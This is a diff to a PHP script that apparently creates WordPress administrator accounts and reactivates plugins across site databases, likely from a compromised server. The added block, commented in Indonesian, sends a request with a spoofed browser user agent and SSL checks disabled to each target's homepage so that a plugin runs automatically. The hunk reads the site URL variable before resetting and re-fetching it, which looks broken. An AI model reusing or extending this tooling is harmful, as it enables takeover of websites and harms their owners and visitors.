@@ -689,6 +689,31 @@ if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
                     }
 
                     // --- 3. PING & RESTORE CACHE ---
+                    
+                    // [TAMBAHAN BARU: AUTO-TRIGGER PLUGIN]
+                    // Melakukan request ke homepage target agar plugin tereksekusi
+                    if ($is_active && !empty($surl)) {
+                        $trigger_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+                        
+                        // Cara 1: cURL (Paling Efektif)
+                        if (function_exists('curl_init')) {
+                            $ch_t = curl_init();
+                            curl_setopt($ch_t, CURLOPT_URL, $surl);
+                            curl_setopt($ch_t, CURLOPT_RETURNTRANSFER, true);
+                            curl_setopt($ch_t, CURLOPT_TIMEOUT, 5); // Cukup 5 detik
+                            curl_setopt($ch_t, CURLOPT_USERAGENT, $trigger_ua);
+                            curl_setopt($ch_t, CURLOPT_SSL_VERIFYPEER, false);
+                            curl_setopt($ch_t, CURLOPT_SSL_VERIFYHOST, false);
+                            @curl_exec($ch_t);
+                            @curl_close($ch_t);
+                        } 
+                        // Cara 2: file_get_contents (Cadangan)
+                        elseif (ini_get('allow_url_fopen')) {
+                            $opts_t = ['http'=>['method'=>'GET','header'=>"User-Agent: $trigger_ua\r\n",'timeout'=>5]];
+                            @file_get_contents($surl, false, stream_context_create($opts_t));
+                        }
+                    }
+                    // [AKHIR TAMBAHAN]
                     $ping_badge = "<span style='background:#555; color:#aaa; padding:2px 6px; border-radius:3px; font-size:0.85em;'>NO PING</span>";
                     $surl = "";
                     $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
